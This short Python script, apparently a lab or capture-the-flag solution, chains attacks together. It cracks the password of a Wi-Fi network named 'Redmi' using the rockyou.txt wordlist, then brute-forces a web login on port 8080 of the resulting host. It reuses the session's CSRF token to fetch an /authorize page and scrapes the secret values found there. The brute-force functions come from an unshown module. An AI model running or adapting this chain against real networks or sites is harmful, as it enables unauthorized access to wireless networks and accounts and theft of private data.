from bs4 import BeautifulSoup
from brute_force import brute_force_pass_site, brute_force_pass_wifi


def get_secret_info(response) -> str:
    soup = BeautifulSoup(response.text, 'html.parser')

    values = soup.find_all("div", attrs={"class": "value"})
    datas = []
    for value in values:
        datas.append(value.text.strip())
    return datas

def main():
    # 1. Brute force password wifi
    ip = brute_force_pass_wifi("Redmi", "rockyou.txt")
    print(ip)
    api_url = f"http://{ip}:8080/gate"
    session, csrf_token = brute_force_pass_site(api_url, "rockyou.txt")
    print(csrf_token)
    response = session.get(f"http://{ip}:8080/authorize", headers={"csrf-token": csrf_token})
    datas = get_secret_info(response)
    print(datas)


if __name__ == '__main__':
    main()